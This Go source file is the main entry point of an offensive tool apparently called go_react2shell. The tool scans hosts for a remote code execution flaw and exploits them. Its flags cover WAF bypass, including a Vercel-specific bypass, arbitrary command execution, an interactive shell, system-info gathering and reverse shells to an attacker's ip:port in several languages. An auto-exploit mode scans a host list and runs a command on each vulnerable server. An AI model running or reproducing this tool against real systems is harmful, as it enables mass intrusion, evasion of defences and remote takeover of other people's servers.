package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/joho/godotenv"
	"github.com/schollz/progressbar/v3"

	"go_react2shell/internal/config"
	"go_react2shell/internal/exploit"
	"go_react2shell/internal/output"
	"go_react2shell/internal/scanner"
)

func main() {
	// Load .env file if present
	_ = godotenv.Load()

	// Define flags
	url := flag.String("u", "", "Single URL/host to check")
	list := flag.String("l", "", "File containing list of hosts (one per line)")
	threads := flag.Int("t", 10, "Number of concurrent threads")
	timeout := flag.Int("timeout", 10, "Request timeout in seconds")
	outputFile := flag.String("o", "", "Output file for results (JSON format)")
	allResults := flag.Bool("all-results", false, "Save all results, not just vulnerable hosts")
	insecure := flag.Bool("k", true, "Disable SSL certificate verification")
	verbose := flag.Bool("v", false, "Verbose output")
	quiet := flag.Bool("q", false, "Quiet mode (only show vulnerable hosts)")
	noColor := flag.Bool("no-color", false, "Disable colored output")
	safeCheck := flag.Bool("safe-check", false, "Use safe side-channel detection")
	windows := flag.Bool("windows", false, "Use Windows PowerShell payload")
	wafBypass := flag.Bool("waf-bypass", false, "Add junk data to bypass WAF")
	wafBypassSize := flag.Int("waf-bypass-size", 128, "Size of junk data in KB for WAF bypass")
	vercelWAFBypass := flag.Bool("vercel-waf-bypass", false, "Use Vercel WAF bypass payload")

	// Exploit mode flags
	exploitMode := flag.Bool("exploit", false, "Enable exploit mode")
	command := flag.String("c", "", "Command to execute (exploit mode)")
	shell := flag.Bool("shell", false, "Start interactive shell (exploit mode)")
	reverseShell := flag.String("revshell", "", "Send reverse shell (format: ip:port)")
	revShellType := flag.String("revshell-type", "bash", "Reverse shell type: bash, python, nc, perl, php, powershell")
	sysInfo := flag.Bool("sysinfo", false, "Get system information from target")
	autoExploit := flag.Bool("auto-exploit", false, "Scan and auto-exploit vulnerable hosts")

	// Path flags
	var paths pathsFlag
	flag.Var(&paths, "path", "Custom path to test (can be used multiple times)")
	pathFile := flag.String("path-file", "", "File containing list of paths to test")

	// Custom headers
	var headers headersFlag
	flag.Var(&headers, "H", "Custom header in 'Key: Value' format (can be used multiple times)")

	flag.Usage = func() {
		printBanner()
		fmt.Printf("Options:\n")
		flag.PrintDefaults()
	}

	flag.Parse()

	// Validate input
	if *url == "" && *list == "" {
		flag.Usage()
		os.Exit(1)
	}

	if *url != "" && *list != "" {
		_, _ = fmt.Fprintf(os.Stderr, "Error: -u and -l are mutually exclusive\n")
		os.Exit(1)
	}

	// Print banner
	printBanner()

	// Build configuration
	cfg := config.DefaultConfig()
	cfg.LoadFromEnv()

	cfg.Timeout = parseDuration(*timeout)
	cfg.Threads = *threads
	cfg.VerifySSL = !*insecure
	cfg.SafeCheck = *safeCheck
	cfg.Windows = *windows
	cfg.WAFBypass = *wafBypass
	cfg.WAFBypassSizeKB = *wafBypassSize
	cfg.VercelWAFBypass = *vercelWAFBypass
	cfg.Verbose = *verbose
	cfg.Quiet = *quiet
	cfg.NoColor = *noColor
	cfg.OutputFile = *outputFile
	cfg.AllResults = *allResults

	// Parse custom headers
	for _, h := range headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			cfg.CustomHeaders[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	// Load paths
	if *pathFile != "" {
		loadedPaths, err := loadPaths(*pathFile)
		if err != nil {
			_, _ = fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
		cfg.Paths = loadedPaths
	} else if len(paths) > 0 {
		cfg.Paths = paths
	}

	// Adjust timeout for WAF bypass
	if cfg.WAFBypass && *timeout == 10 {
		cfg.Timeout = parseDuration(20)
	}

	// Disable colors if requested
	if cfg.NoColor || !isTerminal() {
		output.DisableColors()
	}

	// Load hosts
	var hosts []string
	if *url != "" {
		hosts = []string{*url}
	} else {
		var err error
		hosts, err = loadHosts(*list)
		if err != nil {
			_, _ = fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}
	}

	if len(hosts) == 0 {
		_, _ = fmt.Fprintf(os.Stderr, "Error: no hosts to scan\n")
		os.Exit(1)
	}

	// Exploit mode
	if *exploitMode {
		if len(hosts) != 1 {
			_, _ = fmt.Fprintf(os.Stderr, "Error: exploit mode requires a single target (-u)\n")
			os.Exit(1)
		}

		exp := exploit.New(cfg)

		if *shell {
			if err := exp.InteractiveShell(hosts[0]); err != nil {
				_, _ = fmt.Fprintf(os.Stderr, "Error: %v\n", err)
				os.Exit(1)
			}
			return
		}

		// Reverse shell mode
		if *reverseShell != "" {
			parts := strings.Split(*reverseShell, ":")
			if len(parts) != 2 {
				_, _ = fmt.Fprintf(os.Stderr, "Error: invalid reverse shell format, use ip:port\n")
				os.Exit(1)
			}
			shellType := parseReverseShellType(*revShellType)
			fmt.Printf("[*] Sending %s reverse shell to %s:%s...\n", *revShellType, parts[0], parts[1])
			result := exp.SendReverseShell(hosts[0], parts[0], parts[1], shellType)
			if result.Success {
				fmt.Println("[+] Reverse shell payload sent successfully")
			} else {
				_, _ = fmt.Fprintf(os.Stderr, "Error: %s\n", result.Error)
				os.Exit(1)
			}
			return
		}

		// System info mode
		if *sysInfo {
			fmt.Printf("[*] Gathering system information from %s...\n", hosts[0])
			info := exp.GetSystemInfo(hosts[0])
			fmt.Println(info)
			return
		}

		if *command == "" {
			_, _ = fmt.Fprintf(os.Stderr, "Error: exploit mode requires -c, --shell, --revshell, or --sysinfo\n")
			os.Exit(1)
		}

		result := exp.Execute(hosts[0], *command)
		if result.Success {
			fmt.Println(result.Output)
		} else {
			_, _ = fmt.Fprintf(os.Stderr, "Error: %s\n", result.Error)
			os.Exit(1)
		}
		return
	}

	// Auto-exploit mode: scan first, then exploit vulnerable hosts
	if *autoExploit {
		if *command == "" {
			_, _ = fmt.Fprintf(os.Stderr, "Error: auto-exploit mode requires -c flag\n")
			os.Exit(1)
		}
		runAutoExploit(hosts, cfg, *command)
		return
	}

	// Scanner mode
	if !cfg.Quiet {
		output.PrintBanner()
		fmt.Printf("%s[*] Loaded %d host(s) to scan%s\n", output.Cyan, len(hosts), output.Reset)
		if len(cfg.Paths) > 0 && !(len(cfg.Paths) == 1 && cfg.Paths[0] == "/") {
			fmt.Printf("%s[*] Testing %d path(s): %s%s\n", output.Cyan, len(cfg.Paths), strings.Join(cfg.Paths, ", "), output.Reset)
		}
		fmt.Printf("%s[*] Using %d thread(s)%s\n", output.Cyan, cfg.Threads, output.Reset)
		fmt.Printf("%s[*] Timeout: %v%s\n", output.Cyan, cfg.Timeout, output.Reset)
		if cfg.SafeCheck {
			fmt.Printf("%s[*] Using safe side-channel check%s\n", output.Cyan, output.Reset)
		} else {
			fmt.Printf("%s[*] Using RCE PoC check%s\n", output.Cyan, output.Reset)
		}
		if cfg.Windows {
			fmt.Printf("%s[*] Windows mode enabled%s\n", output.Cyan, output.Reset)
		}
		if cfg.WAFBypass {
			fmt.Printf("%s[*] WAF bypass enabled (%dKB junk data)%s\n", output.Cyan, cfg.WAFBypassSizeKB, output.Reset)
		}
		if cfg.VercelWAFBypass {
			fmt.Printf("%s[*] Vercel WAF bypass mode enabled%s\n", output.Cyan, output.Reset)
		}
		if !cfg.VerifySSL {
			fmt.Printf("%s[!] SSL verification disabled%s\n", output.Yellow, output.Reset)
		}
		fmt.Println()
	}

	// Run scanner
	sc := scanner.New(cfg)
	var results []scanner.Result
	var vulnerableCount, errorCount int

	if len(hosts) == 1 {
		result := sc.Check(hosts[0])
		results = append(results, result)
		if !cfg.Quiet || (result.Vulnerable != nil && *result.Vulnerable) {
			output.PrintResult(result, cfg.Verbose)
		}
		if result.Vulnerable != nil && *result.Vulnerable {
			vulnerableCount = 1
		}
	} else {
		results, vulnerableCount, errorCount = runConcurrentScan(sc, hosts, cfg)
	}

	// Print summary
	if !cfg.Quiet {
		output.PrintSummary(len(hosts), vulnerableCount, errorCount)
	}

	// Save results
	if cfg.OutputFile != "" {
		if err := output.SaveResults(results, cfg.OutputFile, !cfg.AllResults); err != nil {
			_, _ = fmt.Fprintf(os.Stderr, "%s[ERROR] %v%s\n", output.Red, err, output.Reset)
		}
	}

	// Exit code
	if vulnerableCount > 0 {
		os.Exit(1)
	}
	os.Exit(0)
}

func runConcurrentScan(sc *scanner.Scanner, hosts []string, cfg *config.Config) ([]scanner.Result, int, int) {
	var results []scanner.Result
	var resultsMu sync.Mutex
	var vulnerableCount, errorCount int

	// Create a channel for hosts
	hostsChan := make(chan string, len(hosts))
	for _, h := range hosts {
		hostsChan <- h
	}
	close(hostsChan)

	// Progress bar
	var bar *progressbar.ProgressBar
	if !cfg.Quiet {
		bar = progressbar.NewOptions(len(hosts),
			progressbar.OptionSetDescription(fmt.Sprintf("%sScanning%s", output.Cyan, output.Reset)),
			progressbar.OptionSetWidth(40),
			progressbar.OptionShowCount(),
			progressbar.OptionClearOnFinish(),
		)
	}

	// Worker pool
	var wg sync.WaitGroup
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range hostsChan {
				result := sc.Check(host)

				resultsMu.Lock()
				results = append(results, result)
				if result.Vulnerable != nil && *result.Vulnerable {
					vulnerableCount++
					if !cfg.Quiet {
						fmt.Println()
						output.PrintResult(result, cfg.Verbose)
					}
				} else if result.Error != "" {
					errorCount++
					if !cfg.Quiet && cfg.Verbose {
						fmt.Println()
						output.PrintResult(result, cfg.Verbose)
					}
				} else if !cfg.Quiet && cfg.Verbose {
					fmt.Println()
					output.PrintResult(result, cfg.Verbose)
				}
				resultsMu.Unlock()

				if bar != nil {
					_ = bar.Add(1)
				}
			}
		}()
	}

	wg.Wait()
	if bar != nil {
		_ = bar.Finish()
	}

	return results, vulnerableCount, errorCount
}

func loadHosts(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer func() { _ = file.Close() }()

	var hosts []string
	fileScanner := bufio.NewScanner(file)
	for fileScanner.Scan() {
		line := strings.TrimSpace(fileScanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			hosts = append(hosts, line)
		}
	}

	if err := fileScanner.Err(); err != nil {
		return nil, fmt.Errorf("failed to read file: %w", err)
	}

	return hosts, nil
}

func loadPaths(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer func() { _ = file.Close() }()

	var paths []string
	fileScanner := bufio.NewScanner(file)
	for fileScanner.Scan() {
		line := strings.TrimSpace(fileScanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			if !strings.HasPrefix(line, "/") {
				line = "/" + line
			}
			paths = append(paths, line)
		}
	}

	if err := fileScanner.Err(); err != nil {
		return nil, fmt.Errorf("failed to read file: %w", err)
	}

	return paths, nil
}

func parseDuration(seconds int) time.Duration {
	return time.Duration(seconds) * time.Second
}

func isTerminal() bool {
	fileInfo, _ := os.Stdout.Stat()
	return (fileInfo.Mode() & os.ModeCharDevice) != 0
}

func printBanner() {
	banner := `
██████╗  ██████╗     ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔════╝ ██╔═══██╗    ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║     
██║  ███╗██║   ██║    ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║     
██║   ██║██║   ██║    ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║     
╚██████╔╝╚██████╔╝    ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═════╝  ╚═════╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                          by beecynical637
`
	fmt.Printf("%s%s%s\n", output.Cyan, banner, output.Reset)
}

// Custom flag types for multiple values
type headersFlag []string

func (h *headersFlag) String() string {
	return strings.Join(*h, ", ")
}

func (h *headersFlag) Set(value string) error {
	*h = append(*h, value)
	return nil
}

type pathsFlag []string

func (p *pathsFlag) String() string {
	return strings.Join(*p, ", ")
}

func (p *pathsFlag) Set(value string) error {
	path := value
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	*p = append(*p, path)
	return nil
}

// parseReverseShellType converts string to ReverseShellType
func parseReverseShellType(s string) exploit.ReverseShellType {
	switch strings.ToLower(s) {
	case "bash":
		return exploit.ReverseShellBash
	case "python":
		return exploit.ReverseShellPython
	case "nc", "netcat":
		return exploit.ReverseShellNC
	case "perl":
		return exploit.ReverseShellPerl
	case "php":
		return exploit.ReverseShellPHP
	case "powershell", "ps":
		return exploit.ReverseShellPowershell
	default:
		return exploit.ReverseShellBash
	}
}

// runAutoExploit scans hosts and automatically exploits vulnerable ones
func runAutoExploit(hosts []string, cfg *config.Config, command string) {
	if !cfg.Quiet {
		output.PrintBanner()
		fmt.Printf("%s[*] Auto-exploit mode: scanning %d host(s)%s\n", output.Cyan, len(hosts), output.Reset)
		fmt.Printf("%s[*] Command to execute: %s%s\n", output.Cyan, command, output.Reset)
		fmt.Println()
	}

	sc := scanner.New(cfg)
	exp := exploit.New(cfg)

	var vulnerableHosts []string

	// First pass: scan for vulnerable hosts
	fmt.Printf("%s[*] Phase 1: Scanning for vulnerable hosts...%s\n", output.Yellow, output.Reset)
	for _, host := range hosts {
		result := sc.Check(host)
		if result.Vulnerable != nil && *result.Vulnerable {
			vulnerableHosts = append(vulnerableHosts, host)
			fmt.Printf("%s[VULN] %s%s\n", output.Green, host, output.Reset)
		} else if cfg.Verbose {
			fmt.Printf("%s[SAFE] %s%s\n", output.Gray, host, output.Reset)
		}
	}

	if len(vulnerableHosts) == 0 {
		fmt.Printf("%s[*] No vulnerable hosts found%s\n", output.Yellow, output.Reset)
		return
	}

	fmt.Printf("\n%s[*] Phase 2: Exploiting %d vulnerable host(s)...%s\n", output.Yellow, len(vulnerableHosts), output.Reset)

	// Second pass: exploit vulnerable hosts
	for _, host := range vulnerableHosts {
		fmt.Printf("\n%s[*] Exploiting %s%s\n", output.Cyan, host, output.Reset)
		result := exp.Execute(host, command)
		if result.Success {
			fmt.Printf("%s[+] Output:%s\n%s\n", output.Green, output.Reset, result.Output)
		} else {
			fmt.Printf("%s[!] Failed: %s%s\n", output.Red, result.Error, output.Reset)
		}
	}

	fmt.Printf("\n%s[*] Auto-exploit complete. Exploited %d/%d hosts%s\n",
		output.Cyan, len(vulnerableHosts), len(hosts), output.Reset)
}
